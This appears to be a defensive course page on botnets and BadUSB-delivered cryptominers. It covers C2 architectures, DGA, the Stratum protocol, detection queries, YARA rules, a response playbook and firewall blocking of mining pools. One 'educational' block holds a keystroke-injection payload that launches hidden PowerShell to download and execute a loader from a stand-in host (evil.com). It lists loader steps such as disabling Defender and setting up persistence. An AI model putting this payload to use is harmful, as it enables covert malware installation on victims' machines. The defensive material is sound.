# Botnet Understanding

## Overview

Understanding botnet architecture and operations is essential for defenders. BadUSB payloads often deploy botnet components, cryptocurrency miners, or establish C2 communications similar to botnet infrastructure. This knowledge enables better detection and response.

---

## Botnet Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    BOTNET ARCHITECTURE                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│                     ┌──────────────┐                                │
│                     │   BOTMASTER  │                                │
│                     │  (Attacker)  │                                │
│                     └──────┬───────┘                                │
│                            │                                         │
│                     ┌──────▼───────┐                                │
│                     │   C2 SERVER  │                                │
│                     │  (Command &  │                                │
│                     │   Control)   │                                │
│                     └──────┬───────┘                                │
│                            │                                         │
│          ┌─────────────────┼─────────────────┐                      │
│          │                 │                 │                       │
│    ┌─────▼─────┐    ┌─────▼─────┐    ┌─────▼─────┐                 │
│    │    BOT    │    │    BOT    │    │    BOT    │                 │
│    │ (Infected │    │ (Infected │    │ (Infected │                 │
│    │  System)  │    │  System)  │    │  System)  │                 │
│    └───────────┘    └───────────┘    └───────────┘                 │
│                                                                      │
│    Common Functions:                                                 │
│    ├── DDoS attacks                                                 │
│    ├── Spam distribution                                            │
│    ├── Credential theft                                             │
│    ├── Cryptocurrency mining ← Common BadUSB payload               │
│    ├── Ransomware deployment                                        │
│    └── Proxy/VPN services                                           │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## C2 Communication Models

### Centralized C2

```
┌─────────────────────────────────────────────────────────────────────┐
│                   CENTRALIZED C2                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│               ┌──────────────┐                                      │
│               │  C2 Server   │                                      │
│               └──────┬───────┘                                      │
│                      │                                               │
│        ┌─────────────┼─────────────┐                                │
│        │             │             │                                 │
│        ▼             ▼             ▼                                 │
│     ┌─────┐      ┌─────┐      ┌─────┐                              │
│     │ Bot │      │ Bot │      │ Bot │                              │
│     └─────┘      └─────┘      └─────┘                              │
│                                                                      │
│   Advantages: Simple, reliable                                      │
│   Weaknesses: Single point of failure                               │
│   Detection: Block C2 domain/IP                                     │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Peer-to-Peer (P2P) C2

```
┌─────────────────────────────────────────────────────────────────────┐
│                      P2P C2                                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│        ┌─────┐──────────────┌─────┐                                │
│        │ Bot │──────────────│ Bot │                                │
│        └─────┘              └─────┘                                 │
│           │                    │                                     │
│           │    ┌─────┐         │                                     │
│           └────│ Bot │─────────┘                                    │
│                └─────┘                                               │
│                   │                                                  │
│                ┌─────┐                                               │
│                │ Bot │                                               │
│                └─────┘                                               │
│                                                                      │
│   Advantages: No single point of failure                            │
│   Weaknesses: More complex, can be sinkholed                       │
│   Detection: Identify P2P protocol patterns                         │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Domain Generation Algorithm (DGA)

```
┌─────────────────────────────────────────────────────────────────────┐
│                    DGA-BASED C2                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│   Bot generates domains algorithmically:                            │
│                                                                      │
│   Day 1: hdjk3j4k.com ─────────────────────────▶ Not registered    │
│   Day 2: 9dj3kd8s.net ─────────────────────────▶ Not registered    │
│   Day 3: kd83jd92.org ─────────────────────────▶ ATTACKER REGISTERS│
│                                                                      │
│   Attacker only needs to register ONE domain that bots will query  │
│                                                                      │
│   Detection Methods:                                                 │
│   ├── High NXDomain rate                                            │
│   ├── Random-looking domain queries                                 │
│   ├── Machine learning classifiers                                  │
│   └── Known DGA domain lists                                        │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Cryptocurrency Mining Botnets

### How Mining Botnets Work

```
┌─────────────────────────────────────────────────────────────────────┐
│              CRYPTOMINING BOTNET OPERATION                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. INFECTION (via BadUSB, phishing, exploits)                      │
│     └── Miner binary deployed to victim                            │
│                                                                      │
│  2. CONFIGURATION                                                    │
│     ├── Wallet address embedded                                     │
│     ├── Pool address configured                                     │
│     └── CPU/GPU usage throttling (stealth)                         │
│                                                                      │
│  3. MINING OPERATION                                                │
│     ┌──────────────┐                                                │
│     │   Infected   │                                                │
│     │   System     │                                                │
│     │              │                                                │
│     │  ┌────────┐  │    Stratum      ┌──────────────┐             │
│     │  │ Miner  │──┼────Protocol────▶│  Mining Pool │             │
│     │  │Process │  │                  └──────┬───────┘             │
│     │  └────────┘  │                         │                      │
│     │     │        │                         ▼                      │
│     │  CPU/GPU     │                  ┌──────────────┐             │
│     │  Resources   │                  │  Attacker's  │             │
│     └──────────────┘                  │   Wallet     │             │
│                                        └──────────────┘             │
│                                                                      │
│  4. PROFIT                                                          │
│     └── Cryptocurrency deposited to attacker's wallet              │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Common Cryptominers

| Miner | Target Currency | Detection Indicators |
|-------|-----------------|---------------------|
| XMRig | Monero (XMR) | Process name, pool connections |
| CCMiner | Various | GPU usage spikes |
| CPUMiner | Various | High CPU, pool connections |
| Coinhive (defunct) | Monero | JavaScript in browser |
| NiceHash | Multiple | nicehash.com connections |

### Mining Protocol (Stratum)

```json
// Connection (mining.subscribe)
{"id": 1, "method": "mining.subscribe", "params": []}

// Response
{"id": 1, "result": [[["mining.notify", "subscription_id"]], "extranonce1", 4]}

// Authentication (mining.authorize)
{"id": 2, "method": "mining.authorize", "params": ["wallet_address", "password"]}

// Job Assignment (mining.notify)
{"id": null, "method": "mining.notify", "params": ["job_id", "prev_hash", "coinbase1", "coinbase2", "merkle_branches", "version", "nbits", "ntime", true]}

// Solution Submission (mining.submit)
{"id": 4, "method": "mining.submit", "params": ["wallet_address", "job_id", "extranonce2", "ntime", "nonce"]}
```

---

## BadUSB Botnet Deployment

### Common Payload Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│              BADUSB BOTNET DEPLOYMENT                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Stage 1: Initial Access                                            │
│  ────────────────────────                                           │
│  BadUSB → PowerShell → Download Loader                              │
│                                                                      │
│  Stage 2: Loader Execution                                          │
│  ─────────────────────────                                          │
│  Loader → Check Environment → Download Main Payload                 │
│        → Anti-VM checks                                             │
│        → Anti-AV checks                                             │
│        → Persistence installation                                   │
│                                                                      │
│  Stage 3: Payload Execution                                         │
│  ─────────────────────────                                          │
│  Main Payload Options:                                              │
│  ├── RAT (Remote Access Trojan)                                    │
│  ├── Cryptominer                                                    │
│  ├── Info Stealer                                                   │
│  ├── Ransomware                                                     │
│  └── Botnet Agent                                                   │
│                                                                      │
│  Stage 4: C2 Communication                                          │
│  ─────────────────────────                                          │
│  Bot ←──────────────────────────────────────▶ C2 Server            │
│       Beaconing, Commands, Data Exfiltration                        │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Typical BadUSB Miner Payload

```
# Example BadUSB miner deployment flow (Educational)

REM Stage 1: Initial PowerShell
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/loader.ps1')"
ENTER

# loader.ps1 would typically:
# 1. Check if already running
# 2. Disable Windows Defender (if possible)
# 3. Download miner binary
# 4. Configure persistence
# 5. Start mining with throttled CPU
# 6. Report back to C2
```

---

## Detection Strategies

### Behavioral Indicators

```
┌─────────────────────────────────────────────────────────────────────┐
│           BOTNET/MINER DETECTION INDICATORS                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  SYSTEM BEHAVIOR:                                                   │
│  ├── High CPU/GPU utilization (especially idle)                    │
│  ├── Increased power consumption                                    │
│  ├── Fan running constantly                                         │
│  ├── System slowdown                                                │
│  └── Unexpected processes in task manager                          │
│                                                                      │
│  NETWORK BEHAVIOR:                                                  │
│  ├── Connections to mining pools                                    │
│  ├── Regular beacon traffic                                         │
│  ├── Unusual outbound connections                                   │
│  ├── Traffic to known malicious IPs                                │
│  └── Stratum protocol activity                                      │
│                                                                      │
│  FILE SYSTEM:                                                       │
│  ├── Unknown executables in temp folders                           │
│  ├── Scheduled tasks for unknown binaries                          │
│  ├── Startup registry modifications                                 │
│  └── Downloaded scripts in user folders                            │
│                                                                      │
│  PROCESS INDICATORS:                                                │
│  ├── Process names: xmrig, miner, cpuminer                         │
│  ├── Random/obfuscated process names                               │
│  ├── PowerShell with encoded commands                              │
│  └── Processes without visible windows                             │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Detection Queries

```kql
// Microsoft Defender - High CPU Usage
DeviceProcessEvents
| where Timestamp > ago(24h)
| summarize 
    AvgCPU = avg(ProcessCPUUsage),
    MaxCPU = max(ProcessCPUUsage)
    by DeviceName, FileName
| where AvgCPU > 80
| project DeviceName, FileName, AvgCPU, MaxCPU

// Connections to Mining Pools
DeviceNetworkEvents
| where Timestamp > ago(24h)
| where RemotePort in (3333, 3334, 4444, 14444, 14433)
| project Timestamp, DeviceName, RemoteIP, RemotePort, InitiatingProcessFileName

// Stratum Protocol Keywords in Traffic
DeviceNetworkEvents
| where Timestamp > ago(24h)
| where AdditionalFields contains "mining" or
        AdditionalFields contains "stratum" or
        AdditionalFields contains "submit"
| project Timestamp, DeviceName, RemoteIP, RemotePort
```

### YARA Rules

```yara
rule Cryptominer_XMRig {
    meta:
        description = "Detects XMRig cryptocurrency miner"
        author = "Security Team"

    strings:
        $xmrig1 = "xmrig" ascii nocase
        $xmrig2 = "stratum+tcp://" ascii
        $xmrig3 = "stratum+ssl://" ascii
        $pool1 = "pool.minexmr.com" ascii
        $pool2 = "xmr.nanopool.org" ascii
        $config1 = "\"algo\":" ascii
        $config2 = "\"url\":" ascii
        $config3 = "\"user\":" ascii

    condition:
        uint16(0) == 0x5A4D and
        (2 of ($xmrig*) or any of ($pool*)) and
        2 of ($config*)
}

rule Cryptominer_Generic {
    meta:
        description = "Generic cryptocurrency miner detection"

    strings:
        $stratum = "stratum" ascii nocase
        $mining = "mining.subscribe" ascii
        $submit = "mining.submit" ascii
        $job = "mining.notify" ascii
        $wallet = /[a-zA-Z0-9]{95}/ ascii  // Monero wallet pattern

    condition:
        uint16(0) == 0x5A4D and
        ($stratum and ($mining or $submit or $job)) or
        $wallet
}
```

---

## Incident Response: Mining Infection

### Response Playbook

```
┌─────────────────────────────────────────────────────────────────────┐
│           CRYPTOMINER INCIDENT RESPONSE                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. IDENTIFY                                                        │
│  ───────────                                                        │
│  □ Confirm mining activity (CPU usage, network traffic)            │
│  □ Identify affected systems                                        │
│  □ Determine infection vector (BadUSB? Phishing?)                  │
│  □ Check for lateral movement                                       │
│                                                                      │
│  2. CONTAIN                                                         │
│  ──────────                                                         │
│  □ Isolate affected systems from network                           │
│  □ Block mining pool connections at firewall                       │
│  □ Disable persistence mechanisms                                   │
│  □ Preserve evidence (memory dump, logs)                           │
│                                                                      │
│  3. ERADICATE                                                       │
│  ────────────                                                       │
│  □ Terminate miner processes                                        │
│  □ Remove miner binaries                                            │
│  □ Clean registry/scheduled tasks                                   │
│  □ Scan for additional malware                                      │
│  □ Reset compromised credentials                                    │
│                                                                      │
│  4. RECOVER                                                         │
│  ──────────                                                         │
│  □ Verify clean state                                               │
│  □ Restore from backup if needed                                    │
│  □ Return systems to production                                     │
│  □ Enhanced monitoring for 30 days                                  │
│                                                                      │
│  5. LESSONS LEARNED                                                 │
│  ─────────────────                                                  │
│  □ How did infection occur?                                         │
│  □ Why wasn't it detected sooner?                                  │
│  □ What controls should be improved?                               │
│  □ Update detection rules                                           │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Prevention Strategies

### Technical Controls

| Control | Implementation | Effectiveness |
|---------|----------------|---------------|
| USB Device Control | Whitelist approved devices | High |
| Application Whitelisting | Block unknown executables | High |
| Network Segmentation | Limit outbound access | Medium |
| Mining Pool Blocking | Block known pool IPs/domains | Medium |
| EDR/AV | Behavioral detection | Medium-High |
| CPU Usage Monitoring | Alert on sustained high CPU | Low-Medium |

### Network-Level Blocking

```bash
# Block common mining pools (iptables)
iptables -A OUTPUT -d pool.minexmr.com -j DROP
iptables -A OUTPUT -d xmr.nanopool.org -j DROP
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 4444 -j DROP
iptables -A OUTPUT -p tcp --dport 14444 -j DROP

# DNS sinkhole for mining domains
# Add to /etc/hosts or DNS server
0.0.0.0 pool.minexmr.com
0.0.0.0 xmr.nanopool.org
0.0.0.0 monerohash.com
```

---

## Quick Reference

```
┌─────────────────────────────────────────────────────────────────────┐
│              BOTNET/MINER QUICK REFERENCE                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  MINER INDICATORS:                                                  │
│  ├── High CPU/GPU usage                                             │
│  ├── Stratum protocol traffic                                       │
│  ├── Ports 3333, 4444, 14444                                        │
│  ├── Pool domain connections                                        │
│  └── XMRig, CCMiner process names                                  │
│                                                                      │
│  C2 INDICATORS:                                                     │
│  ├── Regular beacon intervals                                       │
│  ├── DGA domain queries                                             │
│  ├── High NXDomain rate                                             │
│  ├── Encoded data in traffic                                        │
│  └── Long-lived connections                                         │
│                                                                      │
│  COMMON MINING POOLS:                                               │
│  ├── pool.minexmr.com                                               │
│  ├── xmr.nanopool.org                                               │
│  ├── supportxmr.com                                                 │
│  ├── monerohash.com                                                 │
│  └── *pool* in domain name                                          │
│                                                                      │
│  RESPONSE PRIORITIES:                                               │
│  1. Isolate affected systems                                        │
│  2. Block pool connections                                          │
│  3. Terminate miner processes                                       │
│  4. Remove persistence                                              │
│  5. Investigate infection vector                                    │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

[← Network Monitoring IDS/IPS](../04_Network_Monitoring_IDS_IPS/) | [Back to Security Operations](../README.md) | [Next: Security Hardening →](../06_Security_Hardening/)
